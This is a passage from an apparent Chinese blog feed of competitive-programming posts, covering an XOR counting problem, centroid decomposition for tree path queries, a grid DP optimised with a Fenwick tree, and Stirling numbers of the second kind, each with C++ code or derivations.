class="number">2e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> pre_xor[maxx];</span><br><span class="line"><span class="type">int</span> b[maxx];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> T;</span><br><span class="line">  cin&gt;&gt;T;</span><br><span class="line">  <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">    ll n,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    pre_xor[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    ll sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n;i++)&#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;b[i]);</span><br><span class="line">      b[i] %= <span class="number">2</span>;</span><br><span class="line">      pre_xor[i] = pre_xor[i - <span class="number">1</span>] ^ b[i];</span><br><span class="line">      sum += pre_xor[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(k == <span class="number">0</span>)&#123;</span><br><span class="line">      cout &lt;&lt; sum * (n + <span class="number">1</span> - sum)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      cout&lt;&lt;(n + <span class="number">1</span>) / <span class="number">2</span> * ((n + <span class="number">1</span>) - (n + <span class="number">1</span>) / <span class="number">2</span>)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>acm</tag>
        <tag>xor</tag>
        <tag>异或</tag>
      </tags>
  </entry>
  <entry>
    <title>点分树点分治</title>
    <url>/2023/12/11/%E7%82%B9%E5%88%86%E6%A0%91%E7%82%B9%E5%88%86%E6%B2%BB/</url>
    <content><![CDATA[<h1 id="题意">题意</h1>
<p>寻找树上是否存在一个长度为k的路径，树中节点有n(n &lt; 1e4)个，有m(m
&lt; 100)个查询。</p>
<h1 id="题解">题解</h1>
<p>路径查询问题，一种暴力的思路如下：</p>
<p>分析路径，假设树为一个有根树，那么我们要查询的路径有两种情况，要么这条路径经过当前树的根节点，要么不经过当前根节点在子树中，所以暴力的方式可以这样子，对于当前的树，记录以根节点为结尾的路径情况，将经过根节点的路径根据所属不同子树进行分类（因为需要后续拼接，拼接的路径需要在不同子树中），根节点的路径计算完之后，然后将子树提出，继续使用上述方法进行处理。
<img src="baoli_fangan.png" alt="baoli_fangan" /></p>
<p>但是分析上述时间复杂度可以知道，如果树的形状为链状，由于一个节点的处理时间与树的大小有关，那么链式处理情况为<span
class="math inline">\(n + (n - 1) + ... + 1 = \frac{n(n +
1)}{2}\)</span>，很明显会超时。</p>
<p>所以为了更加高效的暴力，可以使用点分树的方案，点分树可以用来处理路径，点分树的思路是这样的，在处理一颗树时，首先选择他的重心（重心位置为根时，其子树规模最大值要小于其他位置为根时子树规模最大值），这样的目的是为了后续处理子树时子树的规模能更小，至少会减半。<br />
减半之后，当处理完当前树的重心根节点后，后续处理子树的时候可以将子树当成一个独立的树，因为子树与其他树的路径需要经过重心，但是重心的相关信息已经计算完了，所以单独计算子树内部信息就可以了，这个计算过程可以继续使用上述思路，寻找子树的重心，然后统计信息。由于重心与子树重心相连形成一个新的树，树高为O(logn),每层树的节点数量为n，所以时间复杂度为O(nlogn)</p>
<figure>
<img src="zhong_xin_shu.png" alt="zhong_xin_shu" />
<figcaption aria-hidden="true">zhong_xin_shu</figcaption>
</figure>
<p>这就是大概的处理思路。</p>
<p>但是这道题如果将树建立完毕之后，再进行节点信息统计，会导致内存有一些问题（nlogn的内存占用按理说不应该会发生内存超限），所以这里对节点信息进行离线处理，对每个节点处理之后立即进行查询的离线判断。</p>
<p>代码如下： 代码有一些问题，这里<br />
void get_gra(int posi,int root,int total_size){//,int &amp;zx,int
min_element /* = n*/){ // 注意这个位置，zx的引用会导致程序变慢<br />
递归函数里面有这个引用会导致时间很长，在一组数据中没加应用和加上引用的时间分别为0.04s和4s，差距很大。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2023 Wangxinpeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename：    p3806.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  20:59  2023.11.16</span></span><br><span class="line"><span class="comment">    email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = (<span class="type">int</span>)<span class="number">1e4</span> + <span class="number">10</span>;;</span><br><span class="line"><span class="type">int</span> dis[maxx];  <span class="comment">// 表示距离</span></span><br><span class="line"><span class="type">int</span> ans[maxx];  <span class="comment">// 0 -- &gt; 不存在 1--&gt; 存在</span></span><br><span class="line"><span class="type">int</span> cut[maxx];</span><br><span class="line"><span class="type">int</span> fa[maxx];</span><br><span class="line"><span class="type">int</span> check[maxx];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> f=<span class="number">1</span>,x=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> ss=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(ss&lt;<span class="string">&#x27;0&#x27;</span>||ss&gt;<span class="string">&#x27;9&#x27;</span>)&#123;<span class="keyword">if</span>(ss==<span class="string">&#x27;-&#x27;</span>)f=<span class="number">-1</span>;ss=<span class="built_in">getchar</span>();&#125;</span><br><span class="line">    <span class="keyword">while</span>(ss&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ss&lt;=<span class="string">&#x27;9&#x27;</span>)&#123;x=x*<span class="number">10</span>+ss-<span class="string">&#x27;0&#x27;</span>;ss=<span class="built_in">getchar</span>();&#125;</span><br><span class="line">    <span class="keyword">return</span> f*x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line">  <span class="type">int</span> to,l;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">vector&lt;Edge&gt;G[maxx];</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Edge G[maxx&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> head[maxx];   <span class="comment">// 边开始的位置</span></span><br><span class="line"><span class="type">int</span> next_[maxx&lt;&lt;<span class="number">1</span>];  <span class="comment">// 下一条边的位置</span></span><br><span class="line"><span class="type">int</span> size[maxx];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_edge</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> v,<span class="type">int</span> w,<span class="type">int</span> edge_num)</span></span>&#123;</span><br><span class="line">  next_[edge_num * <span class="number">2</span> + <span class="number">1</span>] = head[u];</span><br><span class="line">  next_[edge_num * <span class="number">2</span> + <span class="number">2</span>] = head[v];</span><br><span class="line">  head[u] = edge_num * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">  head[v] = edge_num * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">  G[edge_num * <span class="number">2</span> + <span class="number">1</span>] = Edge&#123;v,w&#125;;</span><br><span class="line">  G[edge_num * <span class="number">2</span> + <span class="number">2</span>] = Edge&#123;u,w&#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> zx;</span><br><span class="line"><span class="type">int</span> min_elements;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_gra</span><span class="params">(<span class="type">int</span> posi,<span class="type">int</span> root,<span class="type">int</span> total_size)</span></span>&#123;<span class="comment">//,int &amp;zx,int min_element /* = n*/)&#123;            // 注意这个位置，zx的引用会导致程序变慢</span></span><br><span class="line">  <span class="keyword">if</span>(root == <span class="number">-1</span>)&#123;</span><br><span class="line">    total_size = size[posi];</span><br><span class="line">  &#125;</span><br><span class="line">  size[posi] = <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> max_element = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = head[posi];i;i = next_[i])&#123;</span><br><span class="line">    <span class="type">int</span> next_posi = G[i].to;</span><br><span class="line">    <span class="keyword">if</span>(cut[next_posi] == <span class="number">1</span> || root == next_posi)<span class="keyword">continue</span>;</span><br><span class="line">    <span class="built_in">get_gra</span>(next_posi, posi,total_size);<span class="comment">//,zx,min_element);</span></span><br><span class="line">    max_element = <span class="built_in">max</span>(max_element, size[next_posi]);</span><br><span class="line">    size[posi] += size[next_posi];</span><br><span class="line">  &#125;</span><br><span class="line">  max_element = <span class="built_in">max</span>(max_element, total_size - size[posi]);</span><br><span class="line">  <span class="keyword">if</span>(min_elements &gt; max_element)&#123;</span><br><span class="line">    zx = posi;</span><br><span class="line">    min_elements = max_element;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> justify[<span class="number">10000001</span>];</span><br><span class="line"><span class="type">int</span> dis_te[maxx];</span><br><span class="line"><span class="type">int</span> tot;</span><br><span class="line"><span class="type">int</span> tot_pre;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs_cal</span><span class="params">(<span class="type">int</span> posi,<span class="type">int</span> root)</span></span>&#123;  <span class="comment">// 统计其他点到本重心的距离</span></span><br><span class="line">  <span class="keyword">if</span>(root == <span class="number">-1</span>)&#123;</span><br><span class="line">    dis[posi] = <span class="number">0</span>;</span><br><span class="line">    tot = <span class="number">0</span>;</span><br><span class="line">    tot_pre = <span class="number">0</span>;</span><br><span class="line">    justify[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = head[posi];i;i = next_[i])&#123;</span><br><span class="line">    <span class="keyword">if</span>(G[i].to == root || cut[G[i].to] == <span class="number">1</span>)<span class="keyword">continue</span>;</span><br><span class="line">    dis[G[i].to] = dis[posi] + G[i].l;</span><br><span class="line">    <span class="keyword">if</span>(dis[G[i].to] &gt; (<span class="type">int</span>)<span class="number">1e7</span>)<span class="keyword">continue</span>;</span><br><span class="line">    dis_te[tot++] = dis[G[i].to];</span><br><span class="line">    <span class="built_in">dfs_cal</span>(G[i].to,posi);</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="number">-1</span>)&#123;<span class="comment">// 当前子树计算完毕</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>;k &lt; m;k++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ans[k] == <span class="number">1</span>)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = tot_pre;j &lt; tot;j++)&#123;</span><br><span class="line">          <span class="keyword">if</span>(check[k] - dis_te[j] &lt; <span class="number">0</span>)<span class="keyword">continue</span>;</span><br><span class="line">          <span class="keyword">if</span>(justify[check[k] - dis_te[j]] == <span class="number">1</span>)&#123;</span><br><span class="line">            ans[k] = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = tot_pre;j &lt; tot;j++)</span><br><span class="line">        justify[dis_te[j]] = <span class="number">1</span>;</span><br><span class="line">      tot_pre = tot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(root == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; tot;i++)&#123;</span><br><span class="line">      justify[dis_te[i]] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tot = <span class="number">0</span>;</span><br><span class="line">    tot_pre = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> posi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 1. 查找重心位置</span></span><br><span class="line">  <span class="comment">// 2. 使用重心分解树</span></span><br><span class="line">  <span class="type">int</span> g_posi,temp = n + <span class="number">1</span>;</span><br><span class="line">  min_elements = n + <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">get_gra</span>(posi,<span class="number">-1</span>,n);<span class="comment">//,g_posi,temp);       // 获取重心</span></span><br><span class="line">  g_posi = zx;</span><br><span class="line">  <span class="comment">// 数据统计</span></span><br><span class="line">  <span class="built_in">dfs_cal</span>(g_posi,<span class="number">-1</span>);</span><br><span class="line">  cut[g_posi] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = head[g_posi];i;i = next_[i])&#123;</span><br><span class="line">    <span class="keyword">if</span>(cut[G[i].to] == <span class="number">1</span>)<span class="keyword">continue</span>;</span><br><span class="line">    <span class="built_in">dfs</span>(G[i].to);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> g_posi;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">  <span class="built_in">memset</span>(head,<span class="number">0</span>,<span class="built_in">sizeof</span>(head));</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n - <span class="number">1</span>;i++)&#123;</span><br><span class="line">    <span class="type">int</span> u,v,w;</span><br><span class="line">    u = <span class="built_in">read</span>();</span><br><span class="line">    v = <span class="built_in">read</span>();</span><br><span class="line">    w = <span class="built_in">read</span>();</span><br><span class="line">    u--;</span><br><span class="line">    v--;</span><br><span class="line">    <span class="built_in">add_edge</span>(u,v,w,i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; m;i++)&#123;</span><br><span class="line">    check[i] = <span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">if</span>(check[i] == <span class="number">0</span>)ans[i] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  size[<span class="number">0</span>] = n;</span><br><span class="line">  <span class="built_in">dfs</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; m;i++)</span><br><span class="line">    <span class="keyword">if</span>(ans[i])&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;AYE\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;NAY\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>点分树</tag>
        <tag>点分值</tag>
        <tag>树重心</tag>
        <tag>树</tag>
      </tags>
  </entry>
  <entry>
    <title>牛客练习赛125-风车II</title>
    <url>/2024/05/27/%E7%89%9B%E5%AE%A2%E7%BB%83%E4%B9%A0%E8%B5%9B125-%E9%A3%8E%E8%BD%A6II/</url>
    <content><![CDATA[<h1 id="题意">题意</h1>
<p>给一个<span class="math inline">\(n \times
m\)</span>的网格,每个网格有不同的<span
class="math inline">\(a_{ij}\)</span>代表风车颜色，每个网格有不同的风车数量<span
class="math inline">\(b_{ij}\)</span>，小明在<code>(1,1)</code>点，每次只能向x或y坐标增大的方向运动。如果小明只能选择一个颜色的风车收集，那么小明最多能获得多少风车。</p>
<h1 id="思路">思路</h1>
<p>很明显这是一个dp问题，假设<span
class="math inline">\(dp[v][i][j]\)</span>为选择颜色v时走到ij位置时获得最大的风车数量，我们列出简单的dp表达式，</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(ijnt v = <span class="number">1</span>;v &lt;= max_value;v++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; m;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i][j] == v)dp[v][i][j] = <span class="built_in">max</span>(dp[v][i - <span class="number">1</span>][j],dp[v][i][j - <span class="number">1</span>]) + c[i][j];</span><br><span class="line">            <span class="keyword">else</span> dp[v][i][j] = <span class="built_in">max</span>(dp[v][i - <span class="number">1</span>][j],dp[v][i][j - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对空间优化可以通过检查方块遍历与更新的顺序得出，通过记录对未来即将使用的变量进行观察，可以得出如下结论。</p>
<p>这里讨论一种颜色的情况。其中x是当前要计算的位置，v是计算x需要使用的值，s是未来会用到的值。综合来看，s和v都是未来需要用到的值，未来使用的值永远只有一列，所以可以将一个维度抹去，得到如下的计算表达式。</p>
<figure>
<img src="牛客练习赛125-风车II/calculate_order.png"
alt="calculate_order" />
<figcaption aria-hidden="true">calculate_order</figcaption>
</figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span>(ijnt v = <span class="number">1</span>;v &lt;= max_value;v++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; m;j++)&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            if(a[i][j] == v)dp[v][j] = max(dp[v][j],dp[v][j - 1]) + c[i][j];</span></span><br><span class="line"><span class="comment">            else dp[v][j] = max(dp[v][j],dp[v][j - 1]);</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="comment">// 等价于上述代码</span></span><br><span class="line">            dp[v][j] = <span class="built_in">max</span>(dp[v][j],dp[v][j - <span class="number">1</span>])；</span><br><span class="line">            <span class="keyword">if</span>(a[i][j] == v) dp[v][j] += c[i][j];</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但这种优化并不能满足题意，如果将每种颜色的坐标抽出单独处理可能会满足时间复杂度。将每一种颜色的坐标放在一起，并按照行优先的顺序排序得到P，假设按顺序访问到<code>[x,y]</code>根据这个思路可以得到新的dp表达式计算个公式</p>
<p><span class="math display">\[
    dp[v][y] = max_{0&lt;=j&lt;=y}(dp[v][j]) + c[x][y];
\]</span></p>
<p>可以看到max在查询需要查询前y个值的最大值（可以使用离散化处理y，y值会更小），单点修改和区间查询最大值，且区间比较特殊，可以使用树状数组。具体操作可以看下面。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a[maxx&lt;&lt;<span class="number">1</span>],c[maxx&lt;&lt;<span class="number">1</span>];</span><br><span class="line">ll tree[maxx&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> dis_posi[maxx &lt;&lt; <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> max_value,n,m;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x &amp; (-x));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt;= max_value;i++)tree[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> posi,ll value)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = posi;i &lt;= max_value;i += <span class="built_in">lowbit</span>(i))&#123;</span><br><span class="line">    tree[i] = <span class="built_in">max</span>(tree[i], value);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">get_value</span><span class="params">(<span class="type">int</span> posi)</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> ans = posi;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = posi;i &gt; <span class="number">0</span>;i -= <span class="built_in">lowbit</span>(i))&#123;</span><br><span class="line">    ans = tree[ans] &gt; tree[i] ? ans : i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> tree[ans];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">get_posi</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x * m + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">disert</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A)</span></span>&#123;</span><br><span class="line">  <span class="built_in">sort</span>(A.<span class="built_in">begin</span>(),A.<span class="built_in">end</span>());</span><br><span class="line">  A.<span class="built_in">erase</span>(<span class="built_in">unique</span>(A.<span class="built_in">begin</span>(),A.<span class="built_in">end</span>()),A.<span class="built_in">end</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> T;</span><br><span class="line">  cin&gt;&gt;T;</span><br><span class="line">  <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;color;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">0</span> ;j &lt; m;j++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[<span class="built_in">get_posi</span>(i,j)]);</span><br><span class="line">        color.<span class="built_in">push_back</span>(a[<span class="built_in">get_posi</span>(i,j)]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    sort(color.begin(),color.end());</span></span><br><span class="line"><span class="comment">    color.erase(unique(color.begin(),color.end()),color.end());</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">disert</span>(color);</span><br><span class="line">    vector&lt;vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt;<span class="built_in">v</span>(color.<span class="built_in">size</span>(),vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;());</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; m;j++)&#123;</span><br><span class="line">        <span class="type">int</span> posi = <span class="built_in">lower_bound</span>(color.<span class="built_in">begin</span>(),color.<span class="built_in">end</span>(),a[<span class="built_in">get_posi</span>(i,j)]) - color.<span class="built_in">begin</span>();</span><br><span class="line">        v[posi].<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(i,j));</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;c[<span class="built_in">get_posi</span>(i,j)]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ll ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; color.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">      vector&lt;<span class="type">int</span>&gt;p;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; v[i].<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">        p.<span class="built_in">push_back</span>(v[i][j].second);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">disert</span>(p);</span><br><span class="line">      max_value = p.<span class="built_in">size</span>();</span><br><span class="line">      <span class="built_in">init</span>();</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; v[i].<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">        <span class="type">int</span> posi = <span class="built_in">lower_bound</span>(p.<span class="built_in">begin</span>(),p.<span class="built_in">end</span>(),v[i][j].second) - p.<span class="built_in">begin</span>() + <span class="number">1</span>;</span><br><span class="line">        ll value = <span class="built_in">get_value</span>(posi) + c[<span class="built_in">get_posi</span>(v[i][j].first,v[i][j].second)];</span><br><span class="line">        ans = <span class="built_in">max</span>(value,ans);</span><br><span class="line">        <span class="built_in">update</span>(posi,value);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>acm</tag>
        <tag>牛客</tag>
      </tags>
  </entry>
  <entry>
    <title>第二类stirling数</title>
    <url>/2024/05/08/%E7%AC%AC%E4%BA%8C%E7%B1%BBstirling%E6%95%B0/</url>
    <content><![CDATA[<h1 id="第二类stirling数定义">第二类stirling数定义</h1>
<p>第二类stirling用于表示n个元素为k个集合中有多少种分法。例如3个元素分到2个集合中可以有<code>[&#123;1,2&#125;,&#123;3&#125;],[&#123;1&#125;,&#123;2,3&#125;],[&#123;1,3&#125;,&#123;2&#125;]</code>三种分配方案。将这类数记作<code>S(n,k)</code>。</p>
<p><code>S(n,k)</code>满足递推表达式，如果一些题目中能够得到如下表达式可直接套用<code>S(n,k)</code>的通项。</p>
<p><span class="math display">\[ S(n,k) = S(n - 1, k - 1) + k\times S(n
- 1,k) \]</span> 递推式证明如下：</p>
<p>按照最后一个元素的分配情况来看，可分为两种情况：<br />
1.
最后一元素不与其他元素成为一个集合，即最后一个元素单独成为一个集合</p>
<p>这种情况前面<code>n - 1</code>个元素划分为<code>k - 1</code>个集合，最后一个元素
单独成为一个集合，种类数为<code>S(n - 1,k - 1)</code></p>
<ol start="2" type="1">
<li>最后一个元素与其他元素成为一个集合</li>
</ol>
<p>这种情况前面<code>n - 1</code>个元素划分为<code>k</code>个集合，最后一个元素选择一个加入进去就行。故种类数为<span
class="math inline">\(C_{k}^{1}S(n - 1,k)\)</span></p>
<p>上述表达式使用生成函数难以得到通项，但可使用容斥原理计算通项。</p>
<h1 id="容斥原理计算通项">容斥原理计算通项</h1>
<p>把集合视为盒子，假设每个盒子不同，n个元素分到k个盒子里且盒子不为空的种类数应与原问题的种类数相差<span
class="math inline">\(k!\)</span>倍。设<span
class="math inline">\(f_{i}\)</span>为一类条件，表示盒子i不为空。则原问题是在求<span
class="math inline">\(\bigcap_{i = 1}^{k} f_{i} = U - \bigcup_{i =
1}^{k}\bar{f_{i}}\)</span>，全集<span class="math inline">\(U =
\bigcup_{i = 1}^{k}f_{i} \cup \bar{f_{i}}\)</span>，故<span
class="math inline">\(|U| = k^{n}\)</span>，
即每个元素有k个选择方案。对于|<em>{i =
1^{k}{f</em>{i}}}|的计算上可使用容斥原理。</p>
<p><span
class="math inline">\(\bar{f_{i}}\)</span>表示只有第i个箱子为空<strong>其他的任意</strong>（注意不是其他的不为空），所以计数值如下：
<span class="math display">\[
|\bar{f_{i}}| = (k - 1)^{n}
\]</span></p>
<p><span class="math inline">\(\bar{f_{i}} \cap
\bar{f_{j}}\)</span>表示第i与j箱子为空其他任意，所以计数值为:</p>
